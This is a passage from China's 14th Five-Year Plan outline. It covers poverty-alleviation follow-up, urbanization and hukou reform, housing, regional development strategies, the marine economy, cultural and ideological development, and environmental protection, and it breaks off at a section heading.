严格落实“摘帽不摘责任、摘帽不摘政策、摘帽不摘帮扶、摘帽不摘监管”要求，建立健全巩固拓展脱贫攻坚成果长效机制。健全防止返贫动态监测和精准帮扶机制，对易返贫致贫人口实施常态化监测，建立健全快速发现和响应机制，分层分类及时纳入帮扶政策范围。完善农村社会保障和救助制度，健全农村低收入人口常态化帮扶机制。对脱贫地区继续实施城乡建设用地增减挂钩节余指标省内交易政策、调整完善跨省域交易政策。加强扶贫项目资金资产管理和监督，推动特色产业可持续发展。推广以工代赈方式，带动低收入人口就地就近就业。做好易地扶贫搬迁后续帮扶，加强大型搬迁安置区新型城镇化建设。 第二节 提升脱贫地区整体发展水平 实施脱贫地区特色种养业提升行动，广泛开展农产品产销对接活动，深化拓展消费帮扶。在西部地区脱贫县中集中支持一批乡村振兴重点帮扶县，从财政、金融、土地、人才、基础设施、公共服务等方面给予集中支持，增强其巩固脱贫成果及内生发展能力。坚持和完善东西部协作和对口支援、中央单位定点帮扶、社会力量参与帮扶等机制，调整优化东西部协作结对帮扶关系和帮扶方式，强化产业合作和劳务协作。 第八篇 完善新型城镇化战略 提升城镇化发展质量 坚持走中国特色新型城镇化道路，深入推进以人为核心的新型城镇化战略，以城市群、都市圈为依托促进大中小城市和小城镇协调联动、特色化发展，使更多人民群众享有更高品质的城市生活。 第二十七章 加快农业转移人口市民化 坚持存量优先、带动增量，统筹推进户籍制度改革和城镇基本公共服务常住人口全覆盖，健全农业转移人口市民化配套政策体系，加快推动农业转移人口全面融入城市。 第一节 深化户籍制度改革 放开放宽除个别超大城市外的落户限制，试行以经常居住地登记户口制度。全面取消城区常住人口300万以下的城市落户限制，确保外地与本地农业转移人口进城落户标准一视同仁。全面放宽城区常住人口300万至500万的I型大城市落户条件。完善城区常住人口500万以上的超大特大城市积分落户政策，精简积分项目，确保社会保险缴纳年限和居住年限分数占主要比例，鼓励取消年度落户名额限制。健全以居住证为载体、与居住年限等条件相挂钩的基本公共服务提供机制，鼓励地方政府提供更多基本公共服务和办事便利，提高居住证持有人城镇义务教育、住房保障等服务的实际享有水平。 第二节 健全农业转移人口市民化机制 完善财政转移支付与农业转移人口市民化挂钩相关政策，提高均衡性转移支付分配中常住人口折算比例，中央财政市民化奖励资金分配主要依据跨省落户人口数量确定。建立财政性建设资金对吸纳落户较多城市的基础设施投资补助机制，加大中央预算内投资支持力度。调整城镇建设用地年度指标分配依据，建立同吸纳农业转移人口落户数量和提供保障性住房规模挂钩机制。根据人口流动实际调整人口流入流出地区教师、医生等编制定额和基本公共服务设施布局。依法保障进城落户农民农村土地承包权、宅基地使用权、集体收益分配权，建立农村产权流转市场体系，健全农户“三权”市场化退出机制和配套政策。 第二十八章 完善城镇化空间布局 发展壮大城市群和都市圈，分类引导大中小城市发展方向和建设重点，形成疏密有致、分工协作、功能完善的城镇化空间格局。 第一节 推动城市群一体化发展 以促进城市群发展为抓手，全面形成“两横三纵”城镇化战略格局。优化提升京津冀、长三角、珠三角、成渝、长江中游等城市群，发展壮大山东半岛、粤闽浙沿海、中原、关中平原、北部湾等城市群，培育发展哈长、辽中南、山西中部、黔中、滇中、呼包鄂榆、兰州－西宁、宁夏沿黄、天山北坡等城市群。建立健全城市群一体化协调发展机制和成本共担、利益共享机制，统筹推进基础设施协调布局、产业分工协作、公共服务共享、生态共建环境共治。优化城市群内部空间结构，构筑生态和安全屏障，形成多中心、多层级、多节点的网络型城市群。 第二节 建设现代化都市圈 依托辐射带动能力较强的中心城市，提高1小时通勤圈协同发展水平，培育发展一批同城化程度高的现代化都市圈。以城际铁路和市域（郊）铁路等轨道交通为骨干，打通各类“断头路”、“瓶颈路”，推动市内市外交通有效衔接和轨道交通“四网融合”，提高都市圈基础设施连接性贯通性。鼓励都市圈社保和落户积分互认、教育和医疗资源共享，推动科技创新券通兑通用、产业园区和科研平台合作共建。鼓励有条件的都市圈建立统一的规划委员会，实现规划统一编制、统一实施，探索推进土地、人口等统一管理。 第三节 优化提升超大特大城市中心城区功能 统筹兼顾经济、生活、生态、安全等多元需要，转变超大特大城市开发建设方式，加强超大特大城市治理中的风险防控，促进高质量、可持续发展。有序疏解中心城区一般性制造业、区域性物流基地、专业市场等功能和设施，以及过度集中的医疗和高等教育等公共服务资源，合理降低开发强度和人口密度。增强全球资源配置、科技创新策源、高端产业引领功能，率先形成以现代服务业为主体、先进制造业为支撑的产业结构，提升综合能级与国际竞争力。坚持产城融合，完善郊区新城功能，实现多中心、组团式发展。 第四节 完善大中城市宜居宜业功能 充分利用综合成本相对较低的优势，主动承接超大特大城市产业转移和功能疏解，夯实实体经济发展基础。立足特色资源和产业基础，确立制造业差异化定位，推动制造业规模化集群化发展，因地制宜建设先进制造业基地、商贸物流中心和区域专业服务中心。优化市政公用设施布局和功能，支持三级医院和高等院校在大中城市布局，增加文化体育资源供给，营造现代时尚的消费场景，提升城市生活品质。 第五节 推进以县城为重要载体的城镇化建设 加快县城补短板强弱项，推进公共服务、环境卫生、市政公用、产业配套等设施提级扩能，增强综合承载能力和治理能力。支持东部地区基础较好的县城建设，重点支持中西部和东北城镇化地区县城建设，合理支持农产品主产区、重点生态功能区县城建设。健全县城建设投融资机制，更好发挥财政性资金作用，引导金融资本和社会资本加大投入力度。稳步有序推动符合条件的县和镇区常住人口20万以上的特大镇设市。按照区位条件、资源禀赋和发展基础，因地制宜发展小城镇，促进特色小镇规范健康发展。 第二十九章 全面提升城市品质 加快转变城市发展方式，统筹城市规划建设管理，实施城市更新行动，推动城市空间结构优化和品质提升。 第一节 转变城市发展方式 按照资源环境承载能力合理确定城市规模和空间结构，统筹安排城市建设、产业发展、生态涵养、基础设施和公共服务。推行功能复合、立体开发、公交导向的集约紧凑型发展模式，统筹地上地下空间利用，增加绿化节点和公共开敞空间，新建住宅推广街区制。推行城市设计和风貌管控，落实适用、经济、绿色、美观的新时期建筑方针，加强新建高层建筑管控。加快推进城市更新，改造提升老旧小区、老旧厂区、老旧街区和城中村等存量片区功能，推进老旧楼宇改造，积极扩建新建停车场、充电桩。 第二节 推进新型城市建设 顺应城市发展新理念新趋势，开展城市现代化试点示范，建设宜居、创新、智慧、绿色、人文、韧性城市。提升城市智慧化水平，推行城市楼宇、公共空间、地下管网等“一张图”数字化管理和城市运行一网统管。科学规划布局城市绿环绿廊绿楔绿道，推进生态修复和功能完善工程，优先发展城市公共交通，建设自行车道、步行道等慢行网络，发展智能建造，推广绿色建材、装配式建筑和钢结构住宅，建设低碳城市。保护和延续城市文脉，杜绝大拆大建，让城市留下记忆、让居民记住乡愁。建设源头减排、蓄排结合、排涝除险、超标应急的城市防洪排涝体系，推动城市内涝治理取得明显成效。增强公共设施应对风暴、干旱和地质灾害的能力，完善公共设施和建筑应急避难功能。加强无障碍环境建设。拓展城市建设资金来源渠道，建立期限匹配、渠道多元、财务可持续的融资机制。 第三节 提高城市治理水平 坚持党建引领、重心下移、科技赋能，不断提升城市治理科学化精细化智能化水平，推进市域社会治理现代化。改革完善城市管理体制。推广“街乡吹哨、部门报到、接诉即办”等基层管理机制经验，推动资源、管理、服务向街道社区下沉，加快建设现代社区。运用数字技术推动城市管理手段、管理模式、管理理念创新，精准高效满足群众需求。加强物业服务监管，提高物业服务覆盖率、服务质量和标准化水平。 第四节 完善住房市场体系和住房保障体系 坚持房子是用来住的、不是用来炒的定位，加快建立多主体供给、多渠道保障、租购并举的住房制度，让全体人民住有所居、职住平衡。坚持因地制宜、多策并举，夯实城市政府主体责任，稳定地价、房价和预期。建立住房和土地联动机制，加强房地产金融调控，发挥住房税收调节作用，支持合理自住需求，遏制投资投机性需求。加快培育和发展住房租赁市场，有效盘活存量住房资源，有力有序扩大城市租赁住房供给，完善长租房政策，逐步使租购住房在享受公共服务上具有同等权利。加快住房租赁法规建设，加强租赁市场监管，保障承租人和出租人合法权益。有效增加保障性住房供给，完善住房保障基础性制度和支持政策。以人口流入多、房价高的城市为重点，扩大保障性租赁住房供给，着力解决困难群体和新市民住房问题。单列租赁住房用地计划，探索利用集体建设用地和企事业单位自有闲置土地建设租赁住房，支持将非住宅房屋改建为保障性租赁住房。完善土地出让收入分配机制，加大财税、金融支持力度。因地制宜发展共有产权住房。处理好基本保障和非基本保障的关系，完善住房保障方式，健全保障对象、准入门槛、退出管理等政策。改革完善住房公积金制度，健全缴存、使用、管理和运行机制。 第九篇 优化区域经济布局 促进区域协调发展 深入实施区域重大战略、区域协调发展战略、主体功能区战略，健全区域协调发展体制机制，构建高质量发展的区域经济布局和国土空间支撑体系。 第三十章 优化国土空间开发保护格局 立足资源环境承载能力，发挥各地区比较优势，促进各类要素合理流动和高效集聚，推动形成主体功能明显、优势互补、高质量发展的国土空间开发保护新格局。 第一节 完善和落实主体功能区制度 顺应空间结构变化趋势，优化重大基础设施、重大生产力和公共资源布局，分类提高城市化地区发展水平，推动农业生产向粮食生产功能区、重要农产品生产保护区和特色农产品优势区集聚，优化生态安全屏障体系，逐步形成城市化地区、农产品主产区、生态功能区三大空间格局。细化主体功能区划分，按照主体功能定位划分政策单元，对重点开发地区、生态脆弱地区、能源资源富集地区等制定差异化政策，分类精准施策。加强空间发展统筹协调，保障国家重大发展战略落地实施。 第二节 开拓高质量发展的重要动力源 以中心城市和城市群等经济发展优势区域为重点，增强经济和人口承载能力，带动全国经济效率整体提升。以京津冀、长三角、粤港澳大湾区为重点，提升创新策源能力和全球资源配置能力，加快打造引领高质量发展的第一梯队。在中西部有条件的地区，以中心城市为引领，提升城市群功能，加快工业化城镇化进程，形成高质量发展的重要区域。破除资源流动障碍，优化行政区划设置，提高中心城市综合承载能力和资源优化配置能力，强化对区域发展的辐射带动作用。 第三节 提升重要功能性区域的保障能力 以农产品主产区、重点生态功能区、能源资源富集地区和边境地区等承担战略功能的区域为支撑，切实维护国家粮食安全、生态安全、能源安全和边疆安全，与动力源地区共同打造高质量发展的动力系统。支持农产品主产区增强农业生产能力，支持生态功能区把发展重点放到保护生态环境、提供生态产品上，支持生态功能区人口逐步有序向城市化地区转移并定居落户。优化能源开发布局和运输格局，加强能源资源综合开发利用基地建设，提升国内能源供给保障水平。增强边疆地区发展能力，强化人口和经济支撑，促进民族团结和边疆稳定。健全公共资源配置机制，对重点生态功能区、农产品主产区、边境地区等提供有效转移支付。 第三十一章 深入实施区域重大战略 聚焦实现战略目标和提升引领带动能力，推动区域重大战略取得新的突破性进展，促进区域间融合互动、融通补充。 第一节 加快推动京津冀协同发展 紧抓疏解北京非首都功能“牛鼻子”，构建功能疏解政策体系，实施一批标志性疏解项目。高标准高质量建设雄安新区，加快启动区和起步区建设，推动管理体制创新。高质量建设北京城市副中心，促进与河北省三河、香河、大厂三县市一体化发展。推动天津滨海新区高质量发展，支持张家口首都水源涵养功能区和生态环境支撑区建设。提高北京科技创新中心基础研究和原始创新能力，发挥中关村国家自主创新示范区先行先试作用，推动京津冀产业链与创新链深度融合。基本建成轨道上的京津冀，提高机场群港口群协同水平。深化大气污染联防联控联治，强化华北地下水超采及地面沉降综合治理。 第二节 全面推动长江经济带发展 坚持生态优先、绿色发展和共抓大保护、不搞大开发，协同推动生态环境保护和经济发展，打造人与自然和谐共生的美丽中国样板。持续推进生态环境突出问题整改，推动长江全流域按单元精细化分区管控，实施城镇污水垃圾处理、工业污染治理、农业面源污染治理、船舶污染治理、尾矿库污染治理等工程。深入开展绿色发展示范，推进赤水河流域生态环境保护。实施长江十年禁渔。围绕建设长江大动脉，整体设计综合交通运输体系，疏解三峡枢纽瓶颈制约，加快沿江高铁和货运铁路建设。发挥产业协同联动整体优势，构建绿色产业体系。保护好长江文物和文化遗产。 第三节 积极稳妥推进粤港澳大湾区建设 加强粤港澳产学研协同发展，完善广深港、广珠澳科技创新走廊和深港河套、粤澳横琴科技创新极点“两廊两点”架构体系，推进综合性国家科学中心建设，便利创新要素跨境流动。加快城际铁路建设，统筹港口和机场功能布局，优化航运和航空资源配置。深化通关模式改革，促进人员、货物、车辆便捷高效流动。扩大内地与港澳专业资格互认范围，深入推进重点领域规则衔接、机制对接。便利港澳青年到大湾区内地城市就学就业创业，打造粤港澳青少年交流精品品牌。 第四节 提升长三角一体化发展水平 瞄准国际先进科创能力和产业体系，加快建设长三角G60科创走廊和沿沪宁产业创新带，提高长三角地区配置全球资源能力和辐射带动全国发展能力。加快基础设施互联互通，实现长三角地级及以上城市高铁全覆盖，推进港口群一体化治理。打造虹桥国际开放枢纽，强化上海自贸试验区临港新片区开放型经济集聚功能，深化沪苏浙皖自贸试验区联动发展。加快公共服务便利共享，优化优质教育和医疗卫生资源布局。推进生态环境共保联治，高水平建设长三角生态绿色一体化发展示范区。 第五节 扎实推进黄河流域生态保护和高质量发展 加大上游重点生态系统保护和修复力度，筑牢三江源“中华水塔”，提升甘南、若尔盖等区域水源涵养能力。创新中游黄土高原水土流失治理模式，积极开展小流域综合治理、旱作梯田和淤地坝建设。推动下游二级悬河治理和滩区综合治理，加强黄河三角洲湿地保护和修复。开展汾渭平原、河套灌区等农业面源污染治理，清理整顿黄河岸线内工业企业，加强沿黄河城镇污水处理设施及配套管网建设。实施深度节水控水行动，降低水资源开发利用强度。合理控制煤炭开发强度，推进能源资源一体化开发利用，加强矿山生态修复。优化中心城市和城市群发展格局，统筹沿黄河县城和乡村建设。实施黄河文化遗产系统保护工程，打造具有国际影响力的黄河文化旅游带。建设黄河流域生态保护和高质量发展先行区。 第三十二章 深入实施区域协调发展战略 深入推进西部大开发、东北全面振兴、中部地区崛起、东部率先发展，支持特殊类型地区加快发展，在发展中促进相对平衡。 第一节 推进西部大开发形成新格局 强化举措推进西部大开发，切实提高政策精准性和有效性。深入实施一批重大生态工程，开展重点区域综合治理。积极融入“一带一路”建设，强化开放大通道建设，构建内陆多层次开放平台。加大西部地区基础设施投入，支持发展特色优势产业，集中力量巩固脱贫攻坚成果，补齐教育、医疗卫生等民生领域短板。推进成渝地区双城经济圈建设，打造具有全国影响力的重要经济中心、科技创新中心、改革开放新高地、高品质生活宜居地，提升关中平原城市群建设水平，促进西北地区与西南地区合作互动。支持新疆建设国家“三基地一通道”，支持西藏打造面向南亚开放的重要通道。促进400毫米降水线西侧区域保护发展。 第二节 推动东北振兴取得新突破 从维护国家国防、粮食、生态、能源、产业安全的战略高度，加强政策统筹，实现重点突破。加快转变政府职能，深化国有企业改革攻坚，着力优化营商环境，大力发展民营经济。打造辽宁沿海经济带，建设长吉图开发开放先导区，提升哈尔滨对俄合作开放能级。加快发展现代农业，打造保障国家粮食安全的“压舱石”。加大生态资源保护力度，筑牢祖国北疆生态安全屏障。改造提升装备制造等传统优势产业，培育发展新兴产业，大力发展寒地冰雪、生态旅游等特色产业，打造具有国际影响力的冰雪旅游带，形成新的均衡发展产业结构和竞争优势。实施更具吸引力的人才集聚措施。深化与东部地区对口合作。 第三节 开创中部地区崛起新局面 着力打造重要先进制造业基地、提高关键领域自主创新能力、建设内陆地区开放高地、巩固生态绿色发展格局，推动中部地区加快崛起。做大做强先进制造业，在长江、京广、陇海、京九等沿线建设一批中高端产业集群，积极承接新兴产业布局和转移。推动长江中游城市群协同发展，加快武汉、长株潭都市圈建设，打造全国重要增长极。夯实粮食生产基础，不断提高农业综合效益和竞争力，加快发展现代农业。加强生态环境共保联治，着力构筑生态安全屏障。支持淮河、汉江生态经济带上下游合作联动发展。加快对外开放通道建设，高标准高水平建设内陆地区开放平台。提升公共服务保障特别是应对公共卫生等重大突发事件能力。 第四节 鼓励东部地区加快推进现代化 发挥创新要素集聚优势，加快在创新引领上实现突破，推动东部地区率先实现高质量发展。加快培育世界级先进制造业集群，引领新兴产业和现代服务业发展，提升要素产出效率，率先实现产业升级。更高层次参与国际经济合作和竞争，打造对外开放新优势，率先建立全方位开放型经济体系。支持深圳建设中国特色社会主义先行示范区、浦东打造社会主义现代化建设引领区、浙江高质量发展建设共同富裕示范区。深入推进山东新旧动能转换综合试验区建设。 第五节 支持特殊类型地区发展 统筹推进革命老区振兴，因地制宜发展特色产业，传承弘扬红色文化，支持赣闽粤原中央苏区高质量发展示范，推进陕甘宁、大别山、左右江、川陕、沂蒙等革命老区绿色创新发展。推进生态退化地区综合治理和生态脆弱地区保护修复，支持毕节试验区建设。推动资源型地区可持续发展示范区和转型创新试验区建设，实施采煤沉陷区综合治理和独立工矿区改造提升工程。推进老工业基地制造业竞争优势重构，建设产业转型升级示范区。改善国有林场林区基础设施。多措并举解决高海拔地区群众生产生活困难。推进兴边富民、稳边固边，大力改善边境地区生产生活条件，完善沿边城镇体系，支持边境口岸建设，加快抵边村镇和抵边通道建设。推动边境贸易创新发展。加大对重点边境地区发展精准支持力度。 第六节 健全区域协调发展体制机制 建立健全区域战略统筹、市场一体化发展、区域合作互助、区际利益补偿等机制，更好促进发达地区和欠发达地区、东中西部和东北地区共同发展。提升区域合作层次和水平，支持省际交界地区探索建立统一规划、统一管理、合作共建、利益共享的合作新机制。完善财政转移支付支持欠发达地区的机制，逐步实现基本公共服务均等化，引导人才向西部和艰苦边远地区流动。完善区域合作与利益调节机制，支持流域上下游、粮食主产区主销区、资源输出地输入地之间开展多种形式的利益补偿，鼓励探索共建园区、飞地经济等利益共享模式。聚焦铸牢中华民族共同体意识，加大对民族地区发展支持力度，全面深入持久开展民族团结进步宣传教育和创建，促进各民族交往交流交融。 第三十三章 积极拓展海洋经济发展空间 坚持陆海统筹、人海和谐、合作共赢，协同推进海洋生态保护、海洋经济发展和海洋权益维护，加快建设海洋强国。 第一节 建设现代海洋产业体系 围绕海洋工程、海洋资源、海洋环境等领域突破一批关键核心技术。培育壮大海洋工程装备、海洋生物医药产业，推进海水淡化和海洋能规模化利用，提高海洋文化旅游开发水平。优化近海绿色养殖布局，建设海洋牧场，发展可持续远洋渔业。建设一批高质量海洋经济发展示范区和特色化海洋产业集群，全面提高北部、东部、南部三大海洋经济圈发展水平。以沿海经济带为支撑，深化与周边国家涉海合作。 第二节 打造可持续海洋生态环境 探索建立沿海、流域、海域协同一体的综合治理体系。严格围填海管控，加强海岸带综合管理与滨海湿地保护。拓展入海污染物排放总量控制范围，保障入海河流断面水质。加快推进重点海域综合治理，构建流域－河口－近岸海域污染防治联动机制，推进美丽海湾保护与建设。防范海上溢油、危险化学品泄露等重大环境风险，提升应对海洋自然灾害和突发环境事件能力。完善海岸线保护、海域和无居民海岛有偿使用制度，探索海岸建筑退缩线制度和海洋生态环境损害赔偿制度，自然岸线保有率不低于35%。 第三节 深度参与全球海洋治理 积极发展蓝色伙伴关系，深度参与国际海洋治理机制和相关规则制定与实施，推动建设公正合理的国际海洋秩序，推动构建海洋命运共同体。深化与沿海国家在海洋环境监测和保护、科学研究和海上搜救等领域务实合作，加强深海战略性资源和生物多样性调查评价。参与北极务实合作，建设“冰上丝绸之路”。提高参与南极保护和利用能力。加强形势研判、风险防范和法理斗争，加强海事司法建设，坚决维护国家海洋权益。有序推进海洋基本法立法。 第十篇 发展社会主义先进文化 提升国家文化软实力 坚持马克思主义在意识形态领域的指导地位，坚定文化自信，坚持以社会主义核心价值观引领文化建设，围绕举旗帜、聚民心、育新人、兴文化、展形象的使命任务，促进满足人民文化需求和增强人民精神力量相统一，推进社会主义文化强国建设。 第三十四章 提高社会文明程度 加强社会主义精神文明建设，培育和践行社会主义核心价值观，推动形成适应新时代要求的思想观念、精神面貌、文明风尚、行为规范。 第一节 推动理想信念教育常态化制度化 深入开展习近平新时代中国特色社会主义思想学习教育，健全用党的创新理论武装全党、教育人民的工作体系。建立健全“不忘初心、牢记使命”的制度和长效机制，加强和改进思想政治工作，持续开展中国特色社会主义和中国梦宣传教育，加强党史、新中国史、改革开放史、社会主义发展史教育，加强爱国主义、集体主义、社会主义教育，加强革命文化研究阐释和宣传教育，弘扬党和人民在各个历史时期奋斗中形成的伟大精神。完善弘扬社会主义核心价值观的法律政策体系，把社会主义核心价值观要求融入法治建设和社会治理，体现到国民教育、精神文明创建、文化产品创作生产全过程。完善青少年理想信念教育齐抓共管机制。 第二节 发展中国特色哲学社会科学 加强对习近平新时代中国特色社会主义思想的整体性系统性研究、出版传播、宣传阐释，推进马克思主义中国化、时代化、大众化。深入实施马克思主义理论研究和建设工程，推进习近平新时代中国特色社会主义思想研究中心（院）、中国特色社会主义理论体系研究中心等建设，建好用好“学习强国”等学习平台。构建中国特色哲学社会科学学科体系、学术体系和话语体系，深入实施哲学社会科学创新工程，加强中国特色新型智库建设。 第三节 传承弘扬中华优秀传统文化 深入实施中华优秀传统文化传承发展工程，强化重要文化和自然遗产、非物质文化遗产系统性保护，推动中华优秀传统文化创造性转化、创新性发展。加强文物科技创新，实施中华文明探源和考古中国工程，开展中华文化资源普查，加强文物和古籍保护研究利用，推进革命文物和红色遗址保护，完善流失文物追索返还制度。建设长城、大运河、长征、黄河等国家文化公园，加强世界文化遗产、文物保护单位、考古遗址公园、历史文化名城名镇名村保护。健全非物质文化遗产保护传承体系，加强各民族优秀传统手工艺保护和传承。 第四节 持续提升公民文明素养 推进公民道德建设，大力开展社会公德、职业道德、家庭美德、个人品德建设。开展国家勋章、国家荣誉称号获得者和时代楷模、道德模范、最美人物、身边好人的宣传学习。实施文明创建工程，拓展新时代文明实践中心建设，科学规范做好文明城市、文明村镇、文明单位、文明校园、文明家庭评选表彰，深化未成年人思想道德建设。完善市民公约、乡规民约、学生守则、团体章程等社会规范，建立惩戒失德行为机制。弘扬诚信文化，建设诚信社会。广泛开展志愿服务关爱行动。提倡艰苦奋斗、勤俭节约，开展以劳动创造幸福为主题的宣传教育。加强网络文明建设，发展积极健康的网络文化。 第三十五章 提升公共文化服务水平 坚持为人民服务、为社会主义服务的方向，坚持百花齐放、百家争鸣的方针，加强公共文化服务体系建设和体制机制创新，强化中华文化传播推广和文明交流互鉴，更好保障人民文化权益。 第一节 加强优秀文化作品创作生产传播 把提高质量作为文艺作品的生命线，提高文艺原创能力。实施文艺作品质量提升工程，健全重大现实、重大革命、重大历史题材创作规划组织机制，加强农村、少儿等题材创作，不断推出反映时代新气象、讴歌人民新创造的文艺精品。建立健全文化产品创作生产、传播引导、宣传推广的激励机制和评价体系，推动形成健康清朗的文艺生态。加强文化队伍建设，培养造就高水平创作人才和德艺双馨的名家大师。 第二节 完善公共文化服务体系 优化城乡文化资源配置，推进城乡公共文化服务体系一体建设。创新实施文化惠民工程，提升基层综合性文化服务中心功能，广泛开展群众性文化活动。推进公共图书馆、文化馆、美术馆、博物馆等公共文化场馆免费开放和数字化发展。推进媒体深度融合，做强新型主流媒体。完善应急广播体系，实施智慧广电固边工程和乡村工程。发展档案事业。深入推进全民阅读，建设“书香中国”，推动农村电影放映优化升级。创新公共文化服务运行机制，鼓励社会力量参与公共文化服务供给和设施建设运营。 第三节 提升中华文化影响力 加强对外文化交流和多层次文明对话，创新推进国际传播，利用网上网下，讲好中国故事，传播好中国声音，促进民心相通。开展“感知中国”、“走读中国”、“视听中国”活动，办好中国文化年（节）、旅游年（节）。建设中文传播平台，构建中国语言文化全球传播体系和国际中文教育标准体系。 第三十六章 健全现代文化产业体系 坚持把社会效益放在首位、社会效益和经济效益相统一，健全现代文化产业体系和市场体系。 第一节 扩大优质文化产品供给 实施文化产业数字化战略，加快发展新型文化企业、文化业态、文化消费模式，壮大数字创意、网络视听、数字出版、数字娱乐、线上演播等产业。加快提升超高清电视节目制播能力，推进电视频道高清化改造，推进沉浸式视频、云转播等应用。实施文化品牌战略，打造一批有影响力、代表性的文化品牌。培育骨干文化企业，规范发展文化产业园区，推动区域文化产业带建设。积极发展对外文化贸易，开拓海外文化市场，鼓励优秀传统文化产品和影视剧、游戏等数字文化产品“走出去”，加强国家文化出口基地建设。 第二节 推动文化和旅游融合发展 坚持以文塑旅、以旅彰文，打造独具魅力的中华文化旅游体验。深入发展大众旅游、智慧旅游，创新旅游产品体系，改善旅游消费体验。加强区域旅游品牌和服务整合，建设一批富有文化底蕴的世界级旅游景区和度假区，打造一批文化特色鲜明的国家级旅游休闲城市和街区。推进红色旅游、文化遗产旅游、旅游演艺等创新发展，提升度假休闲、乡村旅游等服务品质，完善邮轮游艇、低空旅游等发展政策。健全旅游基础设施和集散体系，推进旅游厕所革命，强化智慧景区建设。建立旅游服务质量评价体系，规范在线旅游经营服务。 第三节 深化文化体制改革 完善文化管理体制和生产经营机制，提升文化治理效能。完善国有文化资产管理体制机制，深化公益性文化事业单位改革，推进公共文化机构法人治理结构改革。深化国有文化企业分类改革，推进国有文艺院团改革和院线制改革。完善文化市场综合执法体制，制定未成年人网络保护、信息网络传播视听等领域法律法规。 第十一篇 推动绿色发展 促进人与自然和谐共生 坚持绿水青山就是金山银山理念，坚持尊重自然、顺应自然、保护自然，坚持节约优先、保护优先、自然恢复为主，实施可持续发展战略，完善生态文明领域统筹协调机制，构建生态文明体系，推动经济社会发展全面绿色转型，建设美丽中国。 第三十七章 提升生态系统质量和稳定性 坚持山水林田湖草系统治理，着力提高生态系统自我修复能力和稳定性，守住自然生态安全边界，促进自然生态系统质量整体改善。 第一节 完善生态安全屏障体系 强化国土空间规划和用途管控，划定落实生态保护红线、永久基本农田、城镇开发边界以及各类海域保护线。以国家重点生态功能区、生态保护红线、国家级自然保护地等为重点，实施重要生态系统保护和修复重大工程，加快推进青藏高原生态屏障区、黄河重点生态区、长江重点生态区和东北森林带、北方防沙带、南方丘陵山地带、海岸带等生态屏障建设。加强长江、黄河等大江大河和重要湖泊湿地生态保护治理，加强重要生态廊道建设和保护。全面加强天然林和湿地保护，湿地保护率提高到55%。科学推进水土流失和荒漠化、石漠化综合治理，开展大规模国土绿化行动，推行林长制。科学开展人工影响天气活动。推行草原森林河流湖泊休养生息，健全耕地休耕轮作制度，巩固退耕还林还草、退田还湖还湿、退围还滩还海成果。 第二节 构建自然保护地体系 科学划定自然保护地保护范围及功能分区，加快整合归并优化各类保护地，构建以国家公园为主体、自然保护区为基础、各类自然公园为补充的自然保护地体系。严格管控自然保护地范围内非生态活动，稳妥推进核心区内居民、耕地、矿权有序退出。完善国家公园管理体制和运营机制，整合设立一批国家公园。实施生物多样性保护重大工程，构筑生物多样性保护网络，加强国家重点保护和珍稀濒危野生动植物及其栖息地的保护修复，加强外来物种管控。完善生态保护和修复用地用海等政策。完善自然保护地、生态保护红线监管制度，开展生态系统保护成效监测评估。 第三节 健全生态保护补偿机制 加大重点生态功能区、重要水系源头地区、自然保护地转移支付力度，鼓励受益地区和保护地区、流域上下游通过资金补偿、产业扶持等多种形式开展横向生态补偿。完善市场化多元化生态补偿，鼓励各类社会资本参与生态保护修复。完善森林、草原和湿地生态补偿制度。推动长江、黄河等重要流域建立全流域生态补偿机制。建立生态产品价值实现机制，在长江流域和三江源国家公园等开展试点。制定实施生态保护补偿条例。 第三十八章 持续改善环境质量 深入打好污染防治攻坚战，建立健全环境治理体系，推进精准、科学、依法、系统治污，协同推进减污降碳，不断改善空气、水环境质量，有效管控土壤污染风险。 第一节 深入开展污染防治行动 坚持源头防治、综合施策，强化多污染物协同控制和区域协同治理。加强城市大气质量达标管理，推进细颗粒物（PM2.5）和臭氧（O3）协同控制，地级及以上城市PM2.5浓度下降10%，有效遏制O3浓度增长趋势，基本消除重污染天气。持续改善京津冀及周边地区、汾渭平原、长三角地区空气质量，因地制宜推动北方地区清洁取暖、工业窑炉治理、非电行业超低排放改造，加快挥发性有机物排放综合整治，氮氧化物和挥发性有机物排放总量分别下降10%以上。完善水污染防治流域协同机制，加强重点流域、重点湖泊、城市水体和近岸海域综合治理，推进美丽河湖保护与建设，化学需氧量和氨氮排放总量分别下降8%，基本消除劣Ⅴ类国控断面和城市黑臭水体。开展城市饮用水水源地规范化建设，推进重点流域重污染企业搬迁改造。推进受污染耕地和建设用地管控修复，实施水土环境风险协同防控。加强塑料污染全链条防治。加强环境噪声污染治理。重视新污染物治理。 第二节 全面提升环境基础设施水平 构建集污水、垃圾、固废、危废、医废处理处置设施和监测监管能力于一体的环境基础设施体系，形成由城市向建制镇和乡村延伸覆盖的环境基础设施网络。推进城镇污水管网全覆盖，开展污水处理差别化精准提标，推广污泥集中焚烧无害化处理，城市污泥无害化处置率达到90%，地级及以上缺水城市污水资源化利用率超过25%。建设分类投放、分类收集、分类运输、分类处理的生活垃圾处理系统。以主要产业基地为重点布局危险废弃物集中利用处置设施。加快建设地级及以上城市医疗废弃物集中处理设施，健全县域医疗废弃物收集转运处置体系。 第三节 严密防控环境风险 建立健全重点风险源评估预警和应急处置机制。全面整治固体废物非法堆存，提升危险废弃物监管和风险防范能力。强化重点区域、重点行业重金属污染监控预警。健全有毒有害化学物质环境风险管理体制，完成重点地区危险化学品生产企业搬迁改造。严格核与辐射安全监管，推进放射性污染防治。建立生态环境突发事件后评估机制和公众健康影响评估制度。在高风险领域推行环境污染强制责任保险。 第四节 积极应对气候变化 落实2030年应对气候变化国家自主贡献目标，制定2030年前碳排放达峰行动方案。完善能源消费总量和强度双控制度，重点控制化石能源消费。实施以碳强度控制为主、碳排放总量控制为辅的制度，支持有条件的地方和重点行业、重点企业率先达到碳排放峰值。推动能源清洁低碳安全高效利用，深入推进工业、建筑、交通等领域低碳转型。加大甲烷、氢氟碳化物、全氟化碳等其他温室气体控制力度。提升生态系统碳汇能力。锚定努力争取2060年前实现碳中和，采取更加有力的政策和措施。加强全球气候变暖对我国承受力脆弱地区影响的观测和评估，提升城乡建设、农业生产、基础设施适应气候变化能力。加强青藏高原综合科学考察研究。坚持公平、共同但有区别的责任及各自能力原则，建设性参与和引领应对气候变化国际合作，推动落实联合国气候变化框架公约及其巴黎协定，积极开展气候变化南南合作。 第五节 健全现代环境治理体系 